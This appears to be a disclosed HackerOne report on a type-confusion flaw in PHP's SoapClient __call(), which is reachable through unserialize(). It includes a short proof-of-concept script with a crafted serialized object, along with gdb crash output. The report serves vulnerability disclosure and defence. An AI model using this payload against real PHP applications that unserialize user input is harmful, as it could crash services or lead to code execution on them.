---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '55030'
original_report_id: '55030'
title: SoapClient's __call() type confusion through unserialize()
team_handle: ibb
created_at: '2015-02-19T00:00:00.000Z'
disclosed_at: '2015-03-03T00:00:00.000Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
asset_identifier: PHP
asset_type: OTHER
max_severity: none
tags:
- hackerone
---

# SoapClient's __call() type confusion through unserialize()

## Metadata

- HackerOne Report ID: 55030
- Weakness: 
- Program: ibb
- Disclosed At: 2015-03-03T00:00:00.000Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://bugs.php.net/bug.php?id=69085

Description:
------------
SoapClient's __call() method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize() calls.

In soap.c:2906

if (zend_hash_find(Z_OBJPROP_P(this_ptr), "__default_headers", sizeof("__default_headers"), (void **) &tmp)==SUCCESS) {
       HashTable *default_headers = Z_ARRVAL_P(*tmp);

the Z_ARRVAL_P macro is called on __default_headers assuming that it is an array without any actual check about it.

It has been shown several times that this kind of vulnerability could lead to crash, arbitrary read/write memory access and code execution, so I'm not discussing about the actual exploitation of this one (you can refer to my previous submissions about natsort() and extract() if needed by the way).
However, it's worth pointing out that given the nature of __call() magic method, any direct call on a user-controlled userialized input should be considered remotely exploitable.


Test script:
---------------
<?php

//tested on 64bit Ubuntu PHP 5.6.6
//crash on memory access violation @1337

$dummy = unserialize('O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:22:"http://localhost/a.xml";s:17:"__default_headers";i:1337;}');
var_dump($dummy->whatever());

?>

Actual result:
--------------
(gdb) r soapvar.php 
Starting program: /usr/bin/php soapvar.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7fffec568700 (LWP 13984)]
[Thread 0x7fffec568700 (LWP 13984) exited]

Program received signal SIGSEGV, Segmentation fault.
zend_hash_internal_pointer_reset_ex (ht=ht@entry=0x539, pos=pos@entry=0x0)
    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020
1020			*pos = ht->pListHead;
(gdb) x/i $pc
=> 0x6e93d3 <zend_hash_internal_pointer_reset_ex+3>:	mov    0x20(%rdi),%rax
(gdb) p $rdi
$1 = 1337

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
